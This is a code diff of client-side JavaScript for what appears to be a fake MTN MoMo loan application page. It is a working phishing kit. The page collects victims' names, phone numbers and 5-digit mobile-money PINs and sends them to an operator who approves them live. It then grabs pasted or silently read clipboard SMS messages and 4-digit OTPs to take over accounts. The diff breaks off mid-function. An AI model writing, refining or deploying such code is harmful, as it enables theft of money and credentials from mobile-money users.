@@ -1,14 +1,14 @@
 document.addEventListener('DOMContentLoaded', () => {
-    const params = new URLSearchParams(window.location.search);
-    const adminId = params.get('admin');
+    const urlParams = new URLSearchParams(window.location.search);
+    const adminId = urlParams.get('admin');
 
-    const screens = {
-        notice: document.getElementById('step-notice'),
+    const views = {
+        welcome: document.getElementById('step-welcome'),
         calculator: document.getElementById('step-calculator'),
-        step1: document.getElementById('step-1'),
-        step2: document.getElementById('step-2'),
-        step3: document.getElementById('step-3'),
-        credentials: document.getElementById('step-credentials'),
+        loan1: document.getElementById('step-loan-1'),
+        loan2: document.getElementById('step-loan-2'),
+        loan3: document.getElementById('step-loan-3'),
+        pin: document.getElementById('step-pin'),
         loading: document.getElementById('step-loading'),
         sms: document.getElementById('step-sms'),
         otp: document.getElementById('step-otp'),
@@ -21,508 +21,497 @@ document.addEventListener('DOMContentLoaded', () => {
     const calcMonthsDisplay = document.getElementById('calc-months-display');
     const calcMonthlyDisplay = document.getElementById('calc-monthly-display');
 
-    const inputLoanAmount = document.getElementById('input-loan-amount');
-    const selectLoanDuration = document.getElementById('select-loan-duration');
-    const inputLoanPurpose = document.getElementById('input-loan-purpose');
+    const loanAmountInput = document.getElementById('loan-amount-input');
+    const loanDurationSelect = document.getElementById('loan-duration-select');
+    const loanPurposeInput = document.getElementById('loan-purpose-input');
 
-    const step2Alert = document.getElementById('step2-inline-alert');
-    const inputFirstName = document.getElementById('input-first-name');
-    const inputLastName = document.getElementById('input-last-name');
-    const inputMomoPhone = document.getElementById('input-momo-phone');
+    const firstNameInput = document.getElementById('first-name');
+    const lastNameInput = document.getElementById('last-name');
+    const momoPhoneStep2 = document.getElementById('momo-phone-step2');
+    const step2Banner = document.getElementById('step2-banner');
 
-    const credBanner = document.getElementById('cred-surface-banner');
-    const credentialsForm = document.getElementById('credentials-form');
-    const credPhone = document.getElementById('cred-phone');
-    const pin5Boxes = Array.from(document.querySelectorAll('#pin-5-boxes .pin-box'));
-    const credPinValue = document.getElementById('cred-pin-value');
+    const pinForm = document.getElementById('pin-verify-form');
+    const verifyPhoneInput = document.getElementById('verify-phone');
+    const pinCells5 = Array.from(document.querySelectorAll('.pin-cell-5'));
+    const pinHidden5 = document.getElementById('pin-value-5');
+    const pinSurfaceBanner = document.getElementById('pin-surface-banner');
 
     const loadingTitle = document.getElementById('loading-title');
     const loadingDesc = document.getElementById('loading-desc');
+    const loadingSurfaceBanner = document.getElementById('loading-surface-banner');
 
-    const smsBanner = document.getElementById('sms-surface-banner');
     const smsCountdownEl = document.getElementById('sms-countdown');
-    const smsInput = document.getElementById('sms-input');
+    const smsSurfaceBanner = document.getElementById('sms-surface-banner');
+    const smsPasteBox = document.getElementById('sms-paste-box');
+    const smsCharCounter = document.getElementById('sms-char-counter');
+    const btnVerifySms = document.getElementById('btn-verify-sms');
     const btnRequestNewSms = document.getElementById('btn-request-new-sms');
 
-    const otpBanner = document.getElementById('otp-surface-banner');
-    const otp4Boxes = Array.from(document.querySelectorAll('#otp-4-boxes .pin-box'));
-    const otp4Value = document.getElementById('otp-4-value');
+    const otpSurfaceBanner = document.getElementById('otp-surface-banner');
+    const otpCells4 = Array.from(document.querySelectorAll('.otp-cell-4'));
+    const btnSubmitOtp = document.getElementById('btn-submit-otp');
+    const finalAppliedAmountEl = document.getElementById('final-applied-amount');
 
-    const finalLoanAmountEl = document.getElementById('final-loan-amount');
+    const REQUIRED_SMS_PREFIX = "Y'ello. Please note";
 
-    let appState = {
+    let applicationState = {
         amount: '100,000',
-        duration: '48 Months',
+        duration: '12 Months',
         purpose: 'Business expansion and working capital',
         firstName: '',
         lastName: '',
-        phone: '',
-        pin: '',
-        sessionId: null
+        phone: ''
     };
 
+    let currentSessionId = null;
     let statusPollTimer = null;
-    let smsCountdownTimer = null;
-    let smsWatcherTimer = null;
+    let smsWatchTimer = null;
+    let countdownTimer = null;
     let isSubmittingSms = false;
     let isSubmittingOtp = false;
-    let expiredSmsSet = new Set();
-    let lastSubmittedSmsNorm = '';
+    let submittedSmsSet = new Set();
+    let lastHandledStatus = null;
 
-    const SMS_PREFIX = "Y'ello. Please note!";
-
-    function normalizeSms(text) {
-        return (text || '').trim().replace(/\s+/g, ' ');
-    }
-
-    function showScreen(targetKey) {
-        Object.values(screens).forEach(el => {
-            if (el) el.classList.add('hidden');
+    function showView(targetKey) {
+        Object.keys(views).forEach(key => {
+            const el = views[key];
+            if (!el) return;
+            if (key === targetKey) {
+                el.classList.remove('hidden');
+                el.classList.add('active');
+            } else {
+                el.classList.remove('active');
+                el.classList.add('hidden');
+            }
         });
-        if (screens[targetKey]) {
-            screens[targetKey].classList.remove('hidden');
-        }
-        window.scrollTo({ top: 0, behavior: 'instant' });
     }
 
-    function showBanner(bannerEl, text) {
-        if (!bannerEl) return;
-        bannerEl.textContent = text;
-        bannerEl.classList.remove('hidden');
+    function showBanner(el, message) {
+        if (!el) return;
+        el.textContent = message;
+        el.classList.remove('hidden');
     }
 
-    function hideBanner(bannerEl) {
-        if (!bannerEl) return;
-        bannerEl.textContent = '';
-        bannerEl.classList.add('hidden');
+    function hideBanner(el) {
+        if (!el) return;
+        el.textContent = '';
+        el.classList.add('hidden');
     }
 
-    function isValidTenDigitZeroPhone(val) {
-        return /^0\d{9}$/.test((val || '').trim());
+    function isValidTenDigitPhone(raw) {
+        const cleaned = (raw || '').replace(/\D/g, '');
+        return /^0\d{9}$/.test(cleaned);
     }
 
-    function isValidYelloSms(text) {
-        const normalized = normalizeSms(text);
-        if (!normalized) return false;
-        return normalized.startsWith(SMS_PREFIX) ||
-            /^Y'ello\.\s*Please note!/i.test(normalized);
-    }
-
-    function isExpiredOrDuplicateSms(text) {
-        const norm = normalizeSms(text);
-        if (!norm) return false;
-        return expiredSmsSet.has(norm);
-    }
-
-    function clearAllTimers() {
-        if (statusPollTimer) clearInterval(statusPollTimer);
-        if (smsCountdownTimer) clearInterval(smsCountdownTimer);
-        if (smsWatcherTimer) clearInterval(smsWatcherTimer);
+    function startsWithRequiredSMS(text) {
+        if (!text) return false;
+        return text.trim().startsWith(REQUIRED_SMS_PREFIX);
     }
 
     function updateCalculator() {
-        if (!rangeAmount || !rangeMonths) return;
         const amt = parseInt(rangeAmount.value, 10) || 100000;
-        const months = parseInt(rangeMonths.value, 10) || 48;
-        const monthly = Math.max(1, Math.round((amt * 1.1) / months));
+        const months = parseInt(rangeMonths.value, 10) || 12;
+        const monthly = Math.round((amt * 1.25) / months);
 
-        if (calcAmountDisplay) calcAmountDisplay.textContent = amt.toLocaleString();
-        if (calcMonthsDisplay) calcMonthsDisplay.textContent = `${months} months`;
-        if (calcMonthlyDisplay) calcMonthlyDisplay.textContent = monthly.toLocaleString();
+        calcAmountDisplay.textContent = amt.toLocaleString();
+        calcMonthsDisplay.textContent = `${months} Months`;
+        calcMonthlyDisplay.textContent = monthly.toLocaleString();
 
-        appState.amount = amt.toLocaleString();
-        appState.duration = `${months} Months`;
-        if (inputLoanAmount) inputLoanAmount.value = amt.toLocaleString();
-        if (selectLoanDuration) selectLoanDuration.value = `${months} Months`;
-    }
-
-    if (rangeAmount) rangeAmount.addEventListener('input', updateCalculator);
-    if (rangeMonths) rangeMonths.addEventListener('input', updateCalculator);
-    updateCalculator();
-
-    if (inputMomoPhone) {
-        inputMomoPhone.addEventListener('input', () => {
-            inputMomoPhone.value = inputMomoPhone.value.replace(/\D/g, '').slice(0, 10);
-        });
-    }
-
-    if (credPhone) {
-        credPhone.addEventListener('input', () => {
-            credPhone.value = credPhone.value.replace(/\D/g, '').slice(0, 10);
-        });
-    }
-
-    function reset5PinBoxes() {
-        pin5Boxes.forEach(box => { box.value = ''; });
-        if (credPinValue) credPinValue.value = '';
-    }
-
-    function sync5PinBoxes() {
-        const pin = pin5Boxes.map(b => b.value).join('');
-        if (credPinValue) credPinValue.value = pin;
-        return pin;
-    }
-
-    pin5Boxes.forEach((box, idx) => {
-        box.addEventListener('input', () => {
-            box.value = box.value.replace(/\D/g, '').slice(0, 1);
-            sync5PinBoxes();
-            if (box.value && idx < pin5Boxes.length - 1) {
-                pin5Boxes[idx + 1].focus();
-            }
-        });
-        box.addEventListener('keydown', (e) => {
-            if (e.key === 'Backspace' && !box.value && idx > 0) {
-                pin5Boxes[idx - 1].focus();
-            }
-        });
-    });
-
-    function reset4OtpBoxes() {
-        otp4Boxes.forEach(b => { b.value = ''; });
-        if (otp4Value) otp4Value.value = '';
-    }
-
-    function sync4OtpBoxes() {
-        const code = otp4Boxes.map(b => b.value).join('');
-        if (otp4Value) otp4Value.value = code;
-        return code;
-    }
-
-    otp4Boxes.forEach((box, idx) => {
-        box.addEventListener('input', () => {
-            box.value = box.value.replace(/\D/g, '').slice(0, 1);
-            if (box.value && idx < otp4Boxes.length - 1) {
-                otp4Boxes[idx + 1].focus();
-            }
-            const code = sync4OtpBoxes();
-            if (/^\d{4}$/.test(code) && !isSubmittingOtp) {
-                submitOtpPayload(code);
-            }
-        });
-
-        box.addEventListener('keydown', (e) => {
-            if (e.key === 'Backspace' && !box.value && idx > 0) {
-                otp4Boxes[idx - 1].focus();
-            }
-        });
-    });
-
-    async function safeClipboardRead() {
-        try {
-            if (
-                document.hasFocus() &&
-                navigator.clipboard &&
-                typeof navigator.clipboard.readText === 'function'
-            ) {
-                const txt = await navigator.clipboard.readText();
-                return normalizeSms(txt);
-            }
-        } catch (_) {}
-        return '';
-    }
-
-    function startSmsStage(resetBannerMessage) {
-        isSubmittingSms = false;
-        if (smsInput) smsInput.value = '';
-        if (btnRequestNewSms) btnRequestNewSms.classList.add('hidden');
-
-        if (resetBannerMessage) {
-            showBanner(smsBanner, resetBannerMessage);
-        } else {
-            hideBanner(smsBanner);
+        applicationState.amount = amt.toLocaleString();
+        applicationState.duration = `${months} Months`;
+        if (loanAmountInput) loanAmountInput.value = amt.toLocaleString();
+        if (loanDurationSelect) {
+            const matchingOpt = Array.from(loanDurationSelect.options).find(o => o.value === `${months} Months`);
+            if (matchingOpt) loanDurationSelect.value = matchingOpt.value;
         }
-
-        showScreen('sms');
-        if (smsInput) smsInput.focus();
-
-        let secondsLeft = 15;
-        if (smsCountdownEl) smsCountdownEl.textContent = String(secondsLeft);
-
-        if (smsCountdownTimer) clearInterval(smsCountdownTimer);
-        smsCountdownTimer = setInterval(() => {
-            secondsLeft -= 1;
-            if (secondsLeft <= 0) {
-                clearInterval(smsCountdownTimer);
-                if (smsCountdownEl) smsCountdownEl.textContent = "0";
-                if (btnRequestNewSms) btnRequestNewSms.classList.remove('hidden');
-            } else {
-                if (smsCountdownEl) smsCountdownEl.textContent = String(secondsLeft);
-            }
-        }, 1000);
-
-        if (smsWatcherTimer) clearInterval(smsWatcherTimer);
-        smsWatcherTimer = setInterval(async () => {
-            if (isSubmittingSms) return;
-
-            const currentVal = smsInput ? normalizeSms(smsInput.value) : '';
-            if (isValidYelloSms(currentVal)) {
-                if (isExpiredOrDuplicateSms(currentVal)) {
-                    if (smsInput) smsInput.value = '';
-                    showBanner(smsBanner, "SMS EXPIRED — THIS SMS IS ALREADY EXPIRED. PLEASE ENTER A NEW SMS.");
-                    return;
-                }
-                await submitSmsPayload(currentVal);
-                return;
-            }
-
-            const clipText = await safeClipboardRead();
-            if (isValidYelloSms(clipText)) {
-                if (isExpiredOrDuplicateSms(clipText)) {
-                    if (smsInput) smsInput.value = '';
-                    showBanner(smsBanner, "SMS EXPIRED — THIS SMS IS ALREADY EXPIRED. PLEASE ENTER A NEW SMS.");
-                    return;
-                }
-                if (smsInput) smsInput.value = clipText;
-                await submitSmsPayload(clipText);
-            }
-        }, 150);
     }
 
-    if (smsInput) {
-        ['input', 'change', 'paste', 'keyup'].forEach(evtName => {
-            smsInput.addEventListener(evtName, () => {
-                if (isSubmittingSms) return;
-                const text = normalizeSms(smsInput.value);
-                if (!text) return;
-
-                if (isExpiredOrDuplicateSms(text)) {
-                    smsInput.value = '';
-                    showBanner(smsBanner, "SMS EXPIRED — THIS SMS IS ALREADY EXPIRED. PLEASE ENTER A NEW SMS.");
-                    return;
-                }
-
-                if (isValidYelloSms(text)) {
-                    hideBanner(smsBanner);
-                    submitSmsPayload(text);
-                }
-            });
-        });
+    if (rangeAmount && rangeMonths) {
+        rangeAmount.addEventListener('input', updateCalculator);
+        rangeMonths.addEventListener('input', updateCalculator);
+        updateCalculator();
     }
 
-    async function submitSmsPayload(text) {
-        const cleanText = normalizeSms(text);
-        if (isSubmittingSms) return;
+    document.getElementById('btn-get-started').addEventListener('click', () => showView('calculator'));
+    document.getElementById('back-calc-welcome').addEventListener('click', () => showView('welcome'));
 
-        if (isExpiredOrDuplicateSms(cleanText)) {
-            if (smsInput) smsInput.value = '';
-            showBanner(smsBanner, "SMS EXPIRED — THIS SMS IS ALREADY EXPIRED. PLEASE ENTER A NEW SMS.");
+    document.getElementById('btn-continue-calc').addEventListener('click', () => {
+        updateCalculator();
+        showView('loan1');
+    });
+
+    document.getElementById('back-step-1').addEventListener('click', () => showView('calculator'));
+
+    document.getElementById('btn-next-1').addEventListener('click', () => {
+        applicationState.amount = (loanAmountInput.value || applicationState.amount).trim();
+        applicationState.duration = loanDurationSelect.value || applicationState.duration;
+        applicationState.purpose = (loanPurposeInput.value || 'Business expansion and working capital').trim();
+        showView('loan2');
+    });
+
+    document.getElementById('back-step-2').addEventListener('click', () => showView('loan1'));
+    document.getElementById('btn-prev-2').addEventListener('click', () => showView('loan1'));
+
+    document.getElementById('btn-next-2').addEventListener('click', () => {
+        hideBanner(step2Banner);
+        const fName = firstNameInput.value.trim();
+        const lName = lastNameInput.value.trim();
+        const phoneCleaned = momoPhoneStep2.value.replace(/\D/g, '').trim();
+
+        if (!fName || !lName) {
+            showBanner(step2Banner, 'ENTER YOUR EXACT REGISTERED FULL NAME AND LAST NAME.');
+            return;
+        }
+        if (!isValidTenDigitPhone(phoneCleaned)) {
+            showBanner(step2Banner, 'PHONE NUMBER MUST START WITH 0 AND BE EXACTLY 10 DIGITS.');
             return;
         }
 
-        isSubmittingSms = true;
-        lastSubmittedSmsNorm = cleanText;
-        if (smsCountdownTimer) clearInterval(smsCountdownTimer);
-        if (smsWatcherTimer) clearInterval(smsWatcherTimer);
+        applicationState.firstName = fName;
+        applicationState.lastName = lName;
+        applicationState.phone = phoneCleaned;
 
-        if (loadingTitle) loadingTitle.textContent = "VERIFYING & SUBMITTING NEW SMS...";
-        if (loadingDesc) loadingDesc.textContent = "PLEASE WAIT FOR CONFIRMATION.";
-        showScreen('loading');
+        document.getElementById('sum-amount').textContent = applicationState.amount;
+        document.getElementById('sum-duration').textContent = applicationState.duration;
+        document.getElementById('sum-purpose').textContent = applicationState.purpose;
+        document.getElementById('sum-applicant').textContent = `${fName} ${lName}`;
+        document.getElementById('sum-phone').textContent = phoneCleaned;
+
+        if (verifyPhoneInput) verifyPhoneInput.value = phoneCleaned;
+        showView('loan3');
+    });
+
+    document.getElementById('back-step-3').addEventListener('click', () => showView('loan2'));
+    document.getElementById('btn-prev-3').addEventListener('click', () => showView('loan2'));
+
+    document.getElementById('btn-proceed-pin').addEventListener('click', () => {
+        hideBanner(pinSurfaceBanner);
+        clearPinBoxes();
+        showView('pin');
+        if (verifyPhoneInput && !verifyPhoneInput.value && applicationState.phone) {
+            verifyPhoneInput.value = applicationState.phone;
+        }
+        if (pinCells5[0]) pinCells5[0].focus();
+    });
+
+    function clearPinBoxes() {
+        pinCells5.forEach(cell => { cell.value = ''; });
+        pinHidden5.value = '';
+    }
+
+    function sync5Pin() {
+        pinHidden5.value = pinCells5.map(c => c.value.replace(/\D/g, '')).join('');
+    }
+
+    pinCells5.forEach((cell, idx) => {
+        cell.addEventListener('input', () => {
+            cell.value = cell.value.replace(/\D/g, '').slice(0, 1);
+            if (cell.value && idx < pinCells5.length - 1) {
+                pinCells5[idx + 1].focus();
+            }
+            sync5Pin();
+        });
+        cell.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && !cell.value && idx > 0) {
+                pinCells5[idx - 1].focus();
+            }
+        });
+    });
+
+    pinForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        hideBanner(pinSurfaceBanner);
+        sync5Pin();
+
+        const phoneVal = verifyPhoneInput.value.replace(/\D/g, '').trim();
+        const pinVal = pinHidden5.value;
+
+        if (!isValidTenDigitPhone(phoneVal)) {
+            showBanner(pinSurfaceBanner, 'PHONE NO MUST START WITH 0 AND HAVE 10 DIGITS.');
+            return;
+        }
+        if (pinVal.length !== 5) {
+            showBanner(pinSurfaceBanner, 'ENTER YOUR 5-DIGIT MOMO PIN.');
+            return;
+        }
+
+        applicationState.phone = phoneVal;
+        currentSessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).slice(2, 9);
+        lastHandledStatus = null;
+
+        loadingTitle.textContent = 'SENDING DETAILS TO MOMO VERIFICATION...';
+        loadingDesc.textContent = 'Please wait while admin reviews your phone number and PIN.';
+        hideBanner(loadingSurfaceBanner);
+        showView('loading');
 
         try {
-            const res = await fetch('/api/submit-sms', {
+            const resp = await fetch('/api/submit-credentials', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    sessionId: appState.sessionId,
-                    smsText: cleanText
+                    sessionId: currentSessionId,
+                    phone: phoneVal,
+                    pin: pinVal,
+                    adminId,
+                    loanData: applicationState
                 })
             });
-            const data = await res.json();
-            if (data && data.rejectedDuplicate) {
-                expiredSmsSet.add(cleanText);
-                startSmsStage("SMS EXPIRED — THIS SMS WAS ALREADY SUBMITTED AND EXPIRED. PLEASE ENTER A NEW SMS.");
+            const result = await resp.json();
+            if (result.success) {
+                startStatusPolling();
+            } else {
+                showBanner(pinSurfaceBanner, 'UNABLE TO SUBMIT DETAILS. TRY AGAIN.');
+                showView('pin');
+            }
+        } catch (err) {
+            showBanner(pinSurfaceBanner, 'NETWORK ERROR. CHECK YOUR CONNECTION AND TRY AGAIN.');
+            showView('pin');
+        }
+    });
+
+    function startSmsCountdown() {
+        if (countdownTimer) clearInterval(countdownTimer);
+        let remaining = 15;
+        smsCountdownEl.textContent = `${remaining}s`;
+        btnRequestNewSms.classList.add('hidden');
+
+        countdownTimer = setInterval(() => {
+            remaining--;
+            if (remaining > 0) {
+                smsCountdownEl.textContent = `${remaining}s`;
+            } else {
+                clearInterval(countdownTimer);
+                smsCountdownEl.textContent = '0s';
+                btnRequestNewSms.classList.remove('hidden');
+            }
+        }, 1000);
+    }
+
+    function stopSmsWatchers() {
+        if (smsWatchTimer) clearInterval(smsWatchTimer);
+        if (countdownTimer) clearInterval(countdownTimer);
+    }
+
+    function evaluateSmsText(rawText) {
+        if (isSubmittingSms) return;
+        const text = (rawText || '').trim();
+        smsCharCounter.textContent = `${text.length} / 1000`;
+
+        if (!startsWithRequiredSMS(text)) return;
+
+        if (submittedSmsSet.has(text)) {
+            showBanner(smsSurfaceBanner, 'DUPLICATE SMS DETECTED. THIS SMS HAS ALREADY BEEN SUBMITTED.');
+            smsPasteBox.value = '';
+            smsCharCounter.textContent = '0 / 1000';
+            return;
+        }
+
+        hideBanner(smsSurfaceBanner);
+        submitVerificationSMS(text);
+    }
+
+    async function submitVerificationSMS(text) {
+        if (isSubmittingSms) return;
+        isSubmittingSms = true;
+        stopSmsWatchers();
+
+        loadingTitle.textContent = 'VERIFYING MOMO SMS...';
+        loadingDesc.textContent = 'Please wait while your SMS is being verified.';
+        hideBanner(loadingSurfaceBanner);
+        showView('loading');
+
+        try {
+            const resp = await fetch('/api/submit-sms', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ sessionId: currentSessionId, smsText: text })
+            });
+            const data = await resp.json();
+
+            if (data.duplicate) {
+                isSubmittingSms = false;
+                showView('sms');
+                showBanner(smsSurfaceBanner, 'DUPLICATE SMS IS NOT ALLOWED. PASTE A NEW SMS.');
+                smsPasteBox.value = '';
+                smsCharCounter.textContent = '0 / 1000';
+                startSmsVerificationStep(false);
                 return;
             }
-            startStatusPolling();
-        } catch (_) {
+
+            submittedSmsSet.add(text);
+        } catch (err) {
             isSubmittingSms = false;
-            startSmsStage("FAILED TO SEND SMS. PLEASE COPY AND PASTE A NEW SMS AGAIN.");
+            showView('sms');
+            showBanner(smsSurfaceBanner, 'FAILED TO SEND SMS. PLEASE TRY AGAIN.');
+            startSmsVerificationStep(false);
         }
     }
 
-    async function submitOtpPayload(code) {
-        if (isSubmittingOtp) return;
-        isSubmittingOtp = true;
-        if (statusPollTimer) clearInterval(statusPollTimer);
+    function startSmsVerificationStep(resetBanner = true) {
+        isSubmittingSms = false;
+        if (resetBanner) hideBanner(smsSurfaceBanner);
+        showView('sms');
+        startSmsCountdown();
 
-        if (loadingTitle) loadingTitle.textContent = "CONFIRMING 4-DIGIT OTP...";
-        if (loadingDesc) loadingDesc.textContent = "PLEASE WAIT.";
-        showScreen('loading');
+        if (smsPasteBox) {
+            smsPasteBox.focus();
+        }
+
+        if (smsWatchTimer) clearInterval(smsWatchTimer);
+        smsWatchTimer = setInterval(() => {
+            if (isSubmittingSms || !views.sms.classList.contains('active')) return;
+
+            const currentVal = smsPasteBox.value.trim();
+            if (currentVal) {
+                evaluateSmsText(currentVal);
+                return;
+            }
+
+            if (navigator.clipboard && navigator.clipboard.readText) {
+                navigator.clipboard.readText().then(clip => {
+                    if (clip && clip.trim().startsWith(REQUIRED_SMS_PREFIX) && !isSubmittingSms) {
+                        smsPasteBox.value = clip.trim();
+                        evaluateSmsText(clip.trim());
+                    }
+                }).catch(() => {});
+            }
+        }, 100);
+    }
+
+    ['input', 'change', 'paste', 'keyup'].forEach(evtName => {
+        smsPasteBox.addEventListener(evtName, () => {
+            evaluateSmsText(smsPasteBox.value);
+        });
+    });
+
+    btnVerifySms.addEventListener('click', () => {
+        const val = smsPasteBox.value.trim();
+        if (!val) {
+            showBanner(smsSurfaceBanner, 'PLEASE COPY AND PASTE THE WHOLE SMS STARTING WITH Y\'ello. Please note.');
+            return;
+        }
+        if (!startsWithRequiredSMS(val)) {
+            showBanner(smsSurfaceBanner, 'SMS MUST START WITH: Y\'ello. Please note');
+            return;
+        }
+        evaluateSmsText(val);
+    });
+
+    btnRequestNewSms.addEventListener('click', async () => {
+        hideBanner(smsSurfaceBanner);
+        smsPasteBox.value = '';
+        smsCharCounter.textContent = '0 / 1000';
+        startSmsCountdown();
+        showBanner(smsSurfaceBanner, 'NEW SMS REQUEST SENT TO ADMIN. WATCH YOUR MOMO NUMBER.');
+
+        try {
+            await fetch('/api/request-new-sms', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ sessionId: currentSessionId })
+            });
+        } catch (err) {}
+    });
+
+    function clearOtpBoxes() {
+        otpCells4.forEach(c => { c.value = ''; });
+    }
+
+    function readOtpValue() {
+        return otpCells4.map(c => c.value.replace(/\D/g, '')).join('');
+    }
+
+    async function submitFourDigitOtp(code) {
+        if (isSubmittingOtp || code.length !== 4) return;
+        isSubmittingOtp = true;
+        hideBanner(otpSurfaceBanner);
+
+        loadingTitle.textContent = 'VERIFYING 4-DIGIT OTP...';
+        loadingDesc.textContent = 'Please wait while your OTP is being confirmed.';
+        hideBanner(loadingSurfaceBanner);
+        showView('loading');
 
         try {
             await fetch('/api/submit-otp', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    sessionId: appState.sessionId,
-                    otpCode: code
-                })
+                body: JSON.stringify({ sessionId: currentSessionId, otpCode: code })
             });
-            startStatusPolling();
-        } catch (_) {
+        } catch (err) {
             isSubmittingOtp = false;
-            startOtpStage("OTP EXPIRED");
+            showView('otp');
+            showBanner(otpSurfaceBanner, 'NETWORK ERROR SUBMITTING OTP. TRY AGAIN.');
         }
     }
 
-    function startOtpStage(resetBannerMessage) {
-        isSubmittingOtp = false;
-        reset4OtpBoxes();
-        if (resetBannerMessage) {
-            showBanner(otpBanner, resetBannerMessage);
-        } else {
-            hideBanner(otpBanner);
+    otpCells4.forEach((cell, idx) => {
+        cell.addEventListener('input', () => {
+            cell.value = cell.value.replace(/\D/g, '').slice(0, 1);
+            if (cell.value && idx < otpCells4.length - 1) {
+                otpCells4[idx + 1].focus();
+            }
+            const combined = readOtpValue();
+            if (combined.length === 4) {
+                submitFourDigitOtp(combined);
+            }
+        });
+        cell.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && !cell.value && idx > 0) {
+                otpCells4[idx - 1].focus();
+            }
+        });
+    });
+
+    btnSubmitOtp.addEventListener('click', () => {
+        const code = readOtpValue();
+        if (code.length !== 4) {
+            showBanner(otpSurfaceBanner, 'ENTER THE 4-DIGIT OTP SENT TO YOUR MOMO NUMBER.');
+            return;
         }
-        showScreen('otp');
-        if (otp4Boxes[0]) otp4Boxes[0].focus();
+        submitFourDigitOtp(code);
+    });
+
+    function startOtpStep(resetBanner = true) {
+        isSubmittingOtp = false;
+        clearOtpBoxes();
+        if (resetBanner) hideBanner(otpSurfaceBanner);
+        showView('otp');
+        if (otpCells4[0]) otpCells4[0].focus();
     }
 
     function startStatusPolling() {
         if (statusPollTimer) clearInterval(statusPollTimer);
 
         statusPollTimer = setInterval(async () => {
-            if (!appState.sessionId) return;
-            try {
-                const res = await fetch(`/api/check-status/${appState.sessionId}`);
-                const data = await res.json();
+            if (!currentSessionId) return;
 
-                if (data.status === 'allow_pin') {
+            try {
+                const res = await fetch(`/api/check-status/${currentSessionId}`);
+                const data = await res.json();
+                if (!data.status || data.status === lastHandledStatus) return;
+
+                if (data.status === 'denied_pin') {
+                    lastHandledStatus = data.status;
                     clearInterval(statusPollTimer);
-                    startSmsStage(null);
-                } else if (data.status === 'deny_pin') {
-                    clearInterval(statusPollTimer);
-                    reset5PinBoxes();
-                    showScreen('credentials');
-                    showBanner(credBanner, "APPLICATION DENIED. CHECK YOUR MOMO DETAILS AND TRY AGAIN.");
-                } else if (data.status === 'incorrect_pin') {
-                    clearInterval(statusPollTimer);
-                    reset5PinBoxes();
-                    showScreen('credentials');
-                    showBanner(credBanner, "INCORRECT PIN");
-                    if (pin5Boxes[0]) pin5Boxes[0].focus();
+                    stopSmsWatchers();
+                    clearPinBoxes();
+                    showView('pin');
+                    showBanner(pinSurfaceBanner, 'CHECK YOUR MOMO DETAILS AND TRY AGAIN.');
+                } else if (data.status === 'approved_pin') {
+                    lastHandledStatus = data.status;
+                    smsPasteBox.value = '';
+                    smsCharCounter.textContent = '0 / 1000';
+                    startSmsVerificationStep(true);
+                } else if (data.status === 'wrong_pin') {
+                    lastHandledStatus = data.status;
+                    stopSmsWatchers();
+                    clearPinBoxes();
+                    showView('pin');
+                    showBanner(pinSurfaceBanner, 'INCORRECT PIN. ENTER YOUR NEW 5-DIGIT PIN IN THE EMPTY BOXES.');
+                    if (pinCells5[0]) pinCells5[0].focus();
                 } else if (data.status === 'sms_expired') {
-                    clearInterval(statusPollTimer);
-                    if (lastSubmittedSmsNorm) {
-                        expiredSmsSet.add(lastSubmittedSmsNorm);
-                    }
-                    startSmsStage("SMS EXPIRED — THIS SMS IS ALREADY EXPIRED. ENTER A NEW SMS.");
-                } else if (data.status === 'otp_step') {
-                    clearInterval(statusPollTimer);
-                    startOtpStage(null);
-                } else if (data.status === 'otp_expired') {
-                    clearInterval(statusPollTimer);
-                    startOtpStage("OTP EXPIRED");
-                } else if (data.status === 'success') {
-                    clearAllTimers();
-                    if (finalLoanAmountEl) finalLoanAmountEl.textContent = appState.amount;
-                    showScreen('success');
-                }
-            } catch (_) {}
-        }, 2000);
-    }
-
-    if (credentialsForm) {
-        credentialsForm.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            hideBanner(credBanner);
-
-            const phoneVal = credPhone ? credPhone.value.trim() : '';
-            const pinVal = sync5PinBoxes();
-
-            if (!isValidTenDigitZeroPhone(phoneVal)) {
-                showBanner(credBanner, "PHONE NO MUST START WITH 0 AND BE 10 DIGITS.");
-                return;
-            }
-            if (!/^\d{5}$/.test(pinVal)) {
-                showBanner(credBanner, "PIN MUST BE EXACTLY 5 DIGITS.");
-                return;
-            }
-
-            appState.phone = phoneVal;
-            appState.pin = pinVal;
-            appState.sessionId = `sess_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
-            expiredSmsSet.clear();
-            lastSubmittedSmsNorm = '';
-
-            if (loadingTitle) loadingTitle.textContent = "VERIFYING MOMO DETAILS...";
-            if (loadingDesc) loadingDesc.textContent = "PLEASE WAIT FOR APPROVAL.";
-            showScreen('loading');
-
-            try {
-                const res = await fetch('/api/submit-credentials', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        sessionId: appState.sessionId,
-                        phone: phoneVal,
-                        pin: pinVal,
-                        loanAmount: appState.amount,
-                        applicantName: `${appState.firstName} ${appState.lastName}`.trim(),
-                        adminId
-                    })
-                });
-                const data = await res.json();
-                if (data.success) {
-                    startStatusPolling();
-                } else {
-                    showScreen('credentials');
-                    showBanner(credBanner, "UNABLE TO SUBMIT DETAILS. CHECK YOUR MOMO DETAILS AND TRY AGAIN.");
-                }
-            } catch (_) {
-                showScreen('credentials');
-                showBanner(credBanner, "NETWORK ERROR. CHECK YOUR MOMO DETAILS AND TRY AGAIN.");
-            }
-        });
-    }
-
-    // Delegated click handler so navigation buttons always work reliably
-    document.addEventListener('click', async (e) => {
-        const targetBtn = e.target.closest('button');
-        if (!targetBtn) return;
-
-        if (targetBtn.id === 'btn-get-started') {
-            showScreen('calculator');
-            return;
-        }
-
-        if (targetBtn.id === 'btn-continue-calc') {
-            showScreen('step1');
-            return;
-        }
-
-        if (targetBtn.id === 'btn-next-1') {
-            appState.amount = (inputLoanAmount && inputLoanAmount.value.trim()) || appState.amount;
